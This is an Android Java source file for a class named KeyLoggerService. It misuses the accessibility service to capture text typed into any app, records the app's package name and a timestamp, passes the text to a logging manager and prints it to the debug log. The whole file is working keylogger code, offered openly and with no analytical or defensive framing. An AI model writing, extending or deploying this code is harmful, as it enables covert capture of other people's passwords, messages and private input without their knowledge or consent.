package com.example.keyloggermanager;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import android.os.Handler;
import android.os.Looper;

import java.util.List;

public class KeyLoggerService extends AccessibilityService {

    private static final long TYPING_PAUSE_THRESHOLD = 5000;

    private final StringBuilder buffer = new StringBuilder();
    private String lastSentText = "";
    private String currentApp = "";
    private final Handler handler = new Handler(Looper.getMainLooper());
    private Runnable sendRunnable;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return;

        String newApp = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        String currentText = getTextFromEvent(event);
        if (currentText.isEmpty()) return;

        // If switched apps, flush buffer
        if (!currentApp.equals(newApp)) {
            flush();
            currentApp = newApp;
        }

        // Replace buffer with new input
        buffer.setLength(0);
        buffer.append(currentText);

        // Reset debounce timer
        if (sendRunnable != null) handler.removeCallbacks(sendRunnable);
        sendRunnable = this::trySendBuffer;
        handler.postDelayed(sendRunnable, TYPING_PAUSE_THRESHOLD);
    }

    private String getTextFromEvent(AccessibilityEvent event) {
        List<CharSequence> texts = event.getText();
        if (texts == null || texts.isEmpty()) return "";

        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : texts) {
            if (cs != null) sb.append(cs);
        }
        return sb.toString();
    }

    private void trySendBuffer() {
        String current = buffer.toString();
        if (!current.equals(lastSentText)) {
            long timestamp = System.currentTimeMillis();
            KeyLoggerManager.getInstance().logKeystroke(getApplicationContext(), currentApp, current, timestamp);
            lastSentText = current;
            Log.d("KeyLoggerService", "Logged: " + current);
        }
    }

    private void flush() {
        trySendBuffer();
        buffer.setLength(0);
        lastSentText = "";
    }

    @Override
    public void onInterrupt() {}

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d("KeyLoggerService", "Keylogger Connected");
    }
}
